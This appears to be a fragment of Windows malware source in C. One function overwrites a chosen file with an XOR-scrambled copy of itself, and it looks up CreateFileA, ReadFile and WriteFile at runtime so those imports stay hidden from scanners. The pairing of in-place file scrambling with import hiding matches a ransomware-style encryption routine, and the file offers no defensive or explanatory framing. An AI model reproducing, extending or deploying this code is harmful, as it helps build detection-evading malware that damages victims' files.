#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* filename, BYTE key){
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    typedef HANDLE(WINAPI* fCF)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL(WINAPI* fRF)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL(WINAPI* fWF)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    fCF _CF = (fCF)GetProcAddress(k32, "CreateFileA");
    fRF _RF = (fRF)GetProcAddress(k32, "ReadFile");
    fWF _WF = (fWF)GetProcAddress(k32, "WriteFile");
    HANDLE h = _CF(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD s = GetFileSize(h, NULL), bR, bW;
        BYTE* buf = (BYTE*)LocalAlloc(LPTR, s);
        _RF(h, buf, s, &bR, NULL);
        for (DWORD i = 0; i < s; i++) buf[i] ^= key;
        SetFilePointer(h, 0, NULL, FILE_BEGIN);
        _WF(h, buf, s, &bW, NULL);
        CloseHandle(h);
        LocalFree(buf);
    }
}